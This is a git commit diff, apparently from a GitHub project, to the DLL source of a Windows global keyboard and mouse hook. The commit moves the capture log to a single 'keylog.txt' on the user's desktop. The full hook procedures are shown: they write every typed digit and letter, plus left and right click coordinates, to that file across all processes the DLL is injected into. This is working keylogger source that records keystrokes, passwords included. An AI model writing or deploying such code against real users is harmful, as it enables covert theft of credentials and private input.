a7cc09586e18df732d25a3d833716129f57ce5b1
BenteVE <44496102+BenteVE@users.noreply.github.com>
2024-03-10 17:14:50 +0100

    Creating a log file at an absolute path (user independent)

--- Procedure/dllmain.cpp
+++ Procedure/dllmain.cpp
@@ -2,99 +2,126 @@
 #include <stdio.h>
 #include <fstream>
 
+#include <shlobj.h> // Using SHGetKnownFolderPath
+#include <KnownFolders.h>
+#include <shlwapi.h> // Using PathCombine
+
+
+// Buffer to store the desktop folder path
+PWSTR desktopPath = nullptr;
+wchar_t filePath[MAX_PATH];
+
 HHOOK global;
 
 //extern "C" makes a function-name in C++ have C linkage (compiler does not mangle the name) so that client C code can link to (use) your function using a C compatible header file that contains just the declaration of your function.
 extern "C" __declspec(dllexport) LRESULT WINAPI procedureKeyboard(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode == HC_ACTION) {
+	if (nCode == HC_ACTION) {
 
-        std::ofstream LogFile;
-        LogFile.open("Logfile.txt", std::ios_base::app);
+		std::ofstream LogFile;
+		// Note: this should be an absolute path to make sure all applications log to the same file
+		// otherwise, each x64 application will create its own logfile at the relative path
+		LogFile.open(filePath, std::ios_base::app);
 
-        //check key up flag not set
-        if (!(HIWORD(lParam) & KF_UP)) {
-            switch (wParam) {
+		//check key up flag not set
+		if (!(HIWORD(lParam) & KF_UP)) {
+			switch (wParam) {
 
-                // Number keys
-            case 0x30: LogFile << "0"; break;
-            case 0x31: LogFile << "1"; break;
-            case 0x32: LogFile << "2"; break;
-            case 0x33: LogFile << "3"; break;
-            case 0x34: LogFile << "4"; break;
-            case 0x35: LogFile << "5"; break;
-            case 0x36: LogFile << "6"; break;
-            case 0x37: LogFile << "7"; break;
-            case 0x38: LogFile << "8"; break;
-            case 0x39: LogFile << "9"; break;
+				// Number keys
+			case 0x30: LogFile << "0"; break;
+			case 0x31: LogFile << "1"; break;
+			case 0x32: LogFile << "2"; break;
+			case 0x33: LogFile << "3"; break;
+			case 0x34: LogFile << "4"; break;
+			case 0x35: LogFile << "5"; break;
+			case 0x36: LogFile << "6"; break;
+			case 0x37: LogFile << "7"; break;
+			case 0x38: LogFile << "8"; break;
+			case 0x39: LogFile << "9"; break;
 
-                // Letter leys
-            case 0x41: LogFile << "a"; break;
-            case 0x42: LogFile << "b"; break;
-            case 0x43: LogFile << "c"; break;
-            case 0x44: LogFile << "d"; break;
-            case 0x45: LogFile << "e"; break;
-            case 0x46: LogFile << "f"; break;
-            case 0x47: LogFile << "g"; break;
-            case 0x48: LogFile << "h"; break;
-            case 0x49: LogFile << "i"; break;
-            case 0x4A: LogFile << "j"; break;
-            case 0x4B: LogFile << "k"; break;
-            case 0x4C: LogFile << "l"; break;
-            case 0x4D: LogFile << "m"; break;
-            case 0x4E: LogFile << "n"; break;
-            case 0x4F: LogFile << "o"; break;
-            case 0x50: LogFile << "p"; break;
-            case 0x51: LogFile << "q"; break;
-            case 0x52: LogFile << "r"; break;
-            case 0x53: LogFile << "s"; break;
-            case 0x54: LogFile << "t"; break;
-            case 0x55: LogFile << "u"; break;
-            case 0x56: LogFile << "v"; break;
-            case 0x57: LogFile << "w"; break;
-            case 0x58: LogFile << "x"; break;
-            case 0x59: LogFile << "y"; break;
-            case 0x5A: LogFile << "z"; break;
+				// Letter keys
+			case 0x41: LogFile << "a"; break;
+			case 0x42: LogFile << "b"; break;
+			case 0x43: LogFile << "c"; break;
+			case 0x44: LogFile << "d"; break;
+			case 0x45: LogFile << "e"; break;
+			case 0x46: LogFile << "f"; break;
+			case 0x47: LogFile << "g"; break;
+			case 0x48: LogFile << "h"; break;
+			case 0x49: LogFile << "i"; break;
+			case 0x4A: LogFile << "j"; break;
+			case 0x4B: LogFile << "k"; break;
+			case 0x4C: LogFile << "l"; break;
+			case 0x4D: LogFile << "m"; break;
+			case 0x4E: LogFile << "n"; break;
+			case 0x4F: LogFile << "o"; break;
+			case 0x50: LogFile << "p"; break;
+			case 0x51: LogFile << "q"; break;
+			case 0x52: LogFile << "r"; break;
+			case 0x53: LogFile << "s"; break;
+			case 0x54: LogFile << "t"; break;
+			case 0x55: LogFile << "u"; break;
+			case 0x56: LogFile << "v"; break;
+			case 0x57: LogFile << "w"; break;
+			case 0x58: LogFile << "x"; break;
+			case 0x59: LogFile << "y"; break;
+			case 0x5A: LogFile << "z"; break;
 
-            }
-        }
+			}
+		}
 
-        // Close the file
-        LogFile.close();
-    }
-    return CallNextHookEx(global, nCode, wParam, lParam);
+		// Close the file
+		LogFile.close();
+	}
+	return CallNextHookEx(global, nCode, wParam, lParam);
 }
 
 extern "C" __declspec(dllexport) LRESULT WINAPI procedureMouse(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode == HC_ACTION) {
+	if (nCode == HC_ACTION) {
 
-        std::ofstream LogFile;
-        LogFile.open("Logfile.txt", std::ios_base::app);
+		std::ofstream LogFile;
+		LogFile.open(filePath, std::ios_base::app);
 
-        //Extracting the data
-        MOUSEHOOKSTRUCT* data = (MOUSEHOOKSTRUCT*)lParam;
+		//Extracting the data
+		MOUSEHOOKSTRUCT* data = (MOUSEHOOKSTRUCT*)lParam;
 
-        if (wParam == WM_LBUTTONDOWN) {
-            LogFile << "Left Mouse click: " << "x: " << data->pt.x << " y: " << data->pt.y << std::endl;
-        }
-        else if (wParam == WM_RBUTTONDOWN) {
-            LogFile << "Right Mouse click: " << "x: " << data->pt.x << " y: " << data->pt.y << std::endl;
-        }
+		if (wParam == WM_LBUTTONDOWN) {
+			LogFile << "Left Mouse click: " << "x: " << data->pt.x << " y: " << data->pt.y << std::endl;
+		}
+		else if (wParam == WM_RBUTTONDOWN) {
+			LogFile << "Right Mouse click: " << "x: " << data->pt.x << " y: " << data->pt.y << std::endl;
+		}
 
-        // Close the file
-        LogFile.close();
-    }
-    return CallNextHookEx(global, nCode, wParam, lParam);
+		// Close the file
+		LogFile.close();
+	}
+	return CallNextHookEx(global, nCode, wParam, lParam);
 }
+
+
+
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
 {
-    switch (ul_reason_for_call)
-    {
-    case DLL_PROCESS_ATTACH:
-    case DLL_THREAD_ATTACH:
-    case DLL_THREAD_DETACH:
-    case DLL_PROCESS_DETACH:
-        break;
-    }
-    return TRUE;
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+	{
+		// Get the desktop folder path
+		if (SHGetKnownFolderPath(FOLDERID_Desktop, 0, nullptr, &desktopPath) == S_OK) {
+			// Concatenate desktop path and filename			
+			PathCombine(filePath, desktopPath, L"keylog.txt");
+			return TRUE;
+		}
+		else {
+			return FALSE;
+		}
+	}
+	case DLL_THREAD_ATTACH:  break;
+	case DLL_THREAD_DETACH: break;
+	case DLL_PROCESS_DETACH:
+		// Free the allocated memory for the path
+		CoTaskMemFree(desktopPath);
+		break;
+	}
+	return TRUE;
 }
